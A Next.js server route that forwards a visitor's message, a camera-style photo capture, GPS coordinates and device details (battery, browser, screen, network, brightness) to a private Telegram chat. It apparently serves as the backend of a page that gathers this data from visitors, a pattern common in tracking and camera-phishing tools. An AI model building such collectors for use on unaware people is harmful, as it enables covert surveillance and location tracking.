import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    const { message, photo, lat, lng, battery, deviceName, networkType, screenRes, browser, brightness } = await req.json();
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.error('Telegram configuration missing');
      return NextResponse.json({ error: 'Telegram configuration missing' }, { status: 500 });
    }

    // Helper to escape HTML special characters
    const escapeHTML = (text: string) => {
      if (!text) return '';
      return text.replace(/[&<>"']/g, (m) => {
        switch (m) {
          case '&': return '&amp;';
          case '<': return '&lt;';
          case '>': return '&gt;';
          case '"': return '&quot;';
          case "'": return '&#039;';
          default: return m;
        }
      });
    };

    // Prepare info message
    const infoMessage = `
<b>💓 Amar Seba - New Activity</b>
-------------------------
📱 <b>Device:</b> ${escapeHTML(deviceName || 'Unknown')}
🔋 <b>Battery:</b> ${battery}%
📶 <b>Network:</b> ${escapeHTML(networkType || 'Unknown')}
🖥️ <b>Screen:</b> ${escapeHTML(screenRes || 'Unknown')}
🌐 <b>Browser:</b> ${escapeHTML(browser || 'Unknown')}
☀️ <b>Display Brightness:</b> ${brightness || 100}%
📍 <b>Location:</b> ${lat && lng ? `<a href="https://www.google.com/maps?q=${lat},${lng}">Google Maps</a>` : 'Not available'}
-------------------------
💬 <b>User Msg:</b> ${escapeHTML(message || 'No message')}
    `;

    // 1. Send Text Info
    const textRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: infoMessage,
        parse_mode: 'HTML',
      }),
    });

    if (!textRes.ok) {
      const errorText = await textRes.text();
      console.error('Telegram sendMessage failed:', errorText);
      return NextResponse.json({ error: `Telegram sendMessage failed: ${textRes.statusText}` }, { status: 502 });
    }

    // 2. Send Photo if available
    if (photo) {
      try {
        // Decode base64 to binary to avoid fetch(dataURL) issues
        const base64Parts = photo.split(',');
        const mime = base64Parts[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
        const binary = atob(base64Parts[1]);
        const array = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) {
          array[i] = binary.charCodeAt(i);
        }
        const blob = new Blob([array], { type: mime });
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'capture.jpg');

        const photoRes = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: 'POST',
          body: formData,
        });

        if (!photoRes.ok) {
          const photoErr = await photoRes.text();
          console.error('Telegram sendPhoto failed:', photoErr);
        }
      } catch (photoEx) {
        console.error('Error processing photo for Telegram:', photoEx);
      }
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Telegram API Error:', error);
    return NextResponse.json({ error: 'Failed to send data' }, { status: 500 });
  }
}
